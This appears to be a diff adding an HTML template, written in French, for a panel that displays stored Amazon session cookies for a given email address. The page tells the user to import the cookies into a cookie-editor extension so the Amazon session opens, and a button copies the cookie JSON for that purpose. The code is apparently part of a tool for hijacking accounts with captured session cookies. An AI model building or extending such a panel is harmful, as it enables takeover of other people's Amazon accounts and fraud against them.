@@ -1,0 +1,136 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Session Amazon - {{ email }}</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: #0a0a0a;
+            color: white;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+        .header {
+            background: #1a1a2e;
+            padding: 15px 20px;
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            border-bottom: 1px solid #333;
+        }
+        .header h1 {
+            font-size: 16px;
+            flex: 1;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            white-space: nowrap;
+        }
+        .btn-back {
+            background: #ff4757;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 8px;
+            font-weight: 600;
+            cursor: pointer;
+            text-decoration: none;
+        }
+        .frame-container {
+            flex: 1;
+            position: relative;
+        }
+        iframe {
+            width: 100%;
+            height: 100%;
+            border: none;
+            position: absolute;
+            top: 0;
+            left: 0;
+        }
+        .loading {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            text-align: center;
+        }
+        .loading-spinner {
+            width: 50px;
+            height: 50px;
+            border: 4px solid #333;
+            border-top-color: #00d26a;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px;
+        }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        .info-box {
+            background: #1a1a2e;
+            padding: 20px;
+            margin: 20px;
+            border-radius: 12px;
+            text-align: center;
+        }
+        .info-box p {
+            margin: 10px 0;
+            color: #aaa;
+        }
+        .info-box a {
+            color: #00d26a;
+            text-decoration: none;
+        }
+        .cookie-info {
+            font-size: 12px;
+            color: #666;
+            margin-top: 10px;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <a href="/" class="btn-back">← Retour</a>
+        <h1>🔐 {{ email }}</h1>
+    </div>
+    
+    <div class="info-box">
+        <p>⚠️ Les cookies ne peuvent pas être injectés dans une iframe pour des raisons de sécurité.</p>
+        <p>Pour ouvrir la session Amazon avec les cookies :</p>
+        <br>
+        <p><strong>1.</strong> Installez une extension de gestion de cookies (ex: EditThisCookie)</p>
+        <p><strong>2.</strong> Importez les cookies ci-dessous</p>
+        <p><strong>3.</strong> Ouvrez <a href="https://www.amazon.fr/gp/movers-and-shakers/?ref_=nav_em_ms_0_1_1_4" target="_blank">Amazon.fr</a></p>
+        <br>
+        <button onclick="copyCookies()" style="background: #00d26a; color: white; border: none; padding: 15px 30px; border-radius: 10px; font-size: 16px; font-weight: 600; cursor: pointer;">
+            📋 Copier les cookies JSON
+        </button>
+        <div class="cookie-info" id="cookie-status"></div>
+    </div>
+    
+    <script>
+        var cookiesData = {{ cookies | safe }};
+        
+        function copyCookies() {
+            // Formater en JSON pour import facile
+            var formatted = JSON.stringify(cookiesData, null, 2);
+            navigator.clipboard.writeText(formatted).then(function() {
+                document.getElementById('cookie-status').textContent = '✅ Cookies copiés! Collez-les dans votre extension.';
+            }).catch(function() {
+                // Fallback pour mobile
+                var textarea = document.createElement('textarea');
+                textarea.value = formatted;
+                document.body.appendChild(textarea);
+                textarea.select();
+                document.execCommand('copy');
+                document.body.removeChild(textarea);
+                document.getElementById('cookie-status').textContent = '✅ Cookies copiés!';
+            });
+        }
+    </script>
+</body>
+</html>
